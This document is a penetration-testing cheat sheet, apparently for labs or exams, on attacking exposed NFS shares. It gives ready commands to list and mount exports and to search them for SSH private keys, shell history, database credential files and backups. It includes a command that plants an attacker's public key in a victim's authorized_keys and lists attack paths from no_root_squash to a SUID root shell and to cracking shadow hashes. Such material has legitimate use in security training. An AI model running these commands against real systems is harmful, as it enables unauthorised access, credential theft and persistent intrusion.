# NFS Battle Card

## What to Check First
```
1. PORT 2049? → nmap -sV -p 2049 target
2. SHOWMOUNT → showmount -e target
3. MOUNT → mount -t nfs target:/share /mnt/nfs -o nolock
4. VERSION → nmap --script nfs-showmount -p 2049 target
```

## High-Value Findings
- **World-readable export** → Free file access (SSH keys, configs)
- **No_root_squash** → Access files as root (root UID 0)
- **Writable export** → Upload SSH keys, scripts
- **Home directory export** → Read ~/.ssh/authorized_keys
- **Backup exports** → Dump all data for offline analysis
- **User SSH keys** → Direct SSH access as that user

## Immediate Commands
```
# List exports
showmount -e target

# Mount with default options
mkdir -p /mnt/nfs
mount -t nfs target:/exported_path /mnt/nfs -o nolock

# Mount as root (check no_root_squash)
mount -t nfs target:/exported_path /mnt/nfs -o nolock,vers=3

# Find SSH keys
find /mnt/nfs -name "id_rsa" 2>/dev/null
find /mnt/nfs -name "authorized_keys" 2>/dev/null
find /mnt/nfs -name "*.pem" 2>/dev/null
find /mnt/nfs -name "known_hosts" 2>/dev/null

# Find sensitive files
find /mnt/nfs -name "*.conf" -o -name "*.config" -o -name "*.bak" -o -name "backup*" 2>/dev/null
find /mnt/nfs -name ".bash_history" -o -name ".my.cnf" 2>/dev/null

# Check root squashing
touch /mnt/nfs/test_file 2>/dev/null && echo "Writable!" || echo "Read-only"
# Create file owned by root UID
sudo touch /mnt/nfs/test_root
ls -la /mnt/nfs/ | head -20

# Upload SSH key (if writable)
cp /root/.ssh/id_rsa.pub /mnt/nfs/home/user/.ssh/authorized_keys
```

## Common Attack Paths
```
SHOWMOUNT → Export List → Mount → SSH Keys → SSH Shell
SHOWMOUNT → Home Export → authorized_keys Write → SSH Access
NO_ROOT_SQUASH → Upload SUID Binary → Root Shell
SHOWMOUNT → Config Files → DB/App Creds → Shell
SHOWMOUNT → Backups → Password Hashes → Crack → Shell
WRITABLE EXPORT → Upload SSH Key → SSH Access → Shell
```

## Escalation Paths
- **SSH key found** → Direct SSH (check user and root)
- **no_root_squash writable** → chown root → SUID binary → Root
- **Config with DB password** → MySQL/MSSQL → More data
- **Home directory writable** → .ssh/authorized_keys write → SSH
- **Backup with shadow** → Crack hashes → User password

## When to Stop
- showmount fails (portmap/rpcbind not accessible)
- No exports listed
- Read-only exports with nothing useful
- NFS is rarely primary foothold (secondary information source)

## Common Mistakes
- Not checking `no_root_squash` (mount with vers=3)
- Not checking writable permissions on exports
- Only looking in root of export (miss subdirectories)
- Forgetting to copy SSH keys to attack machine
- Not checking home directory exports with `--no-root-squash`
- Interactive browsing vs `find` commands for targeted search
